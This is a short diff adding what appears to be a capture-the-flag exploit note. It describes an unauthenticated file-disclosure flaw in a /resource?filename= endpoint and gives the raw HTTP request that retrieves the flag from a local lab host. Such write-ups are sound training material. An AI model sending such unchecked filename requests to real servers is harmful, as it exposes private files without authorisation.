@@ -1,0 +1,4 @@
+# Unauthenticated file disclosure via /resource?filename= endpoint. Returns the CTF flag file directly. The endpoint is used to serve static assets but performs no path restriction or authentication check.
+
+GET /resource?filename=flag HTTP/1.1
+Host: 172.17.0.1:41823
